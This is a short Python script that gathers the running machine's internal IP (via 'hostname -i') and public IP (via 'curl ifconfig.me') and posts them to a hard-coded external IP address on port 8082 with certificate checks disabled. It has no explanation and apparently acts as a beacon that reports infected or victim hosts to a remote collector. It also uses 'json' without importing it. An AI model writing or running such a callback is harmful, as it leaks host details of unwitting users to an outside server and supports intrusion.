import requests
import subprocess
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = 'https://142.93.36.242:8082/connections'
a = subprocess.run(['hostname -i'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
b = subprocess.run(['curl ifconfig.me'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
data = [a.stdout.decode(),b.stdout.decode(),'test','test','test','test','test','test']

res = requests.post(url, headers={'Content-Type': 'application/json'}, data=json.dumps(data), verify=False)
print(res.status_code)
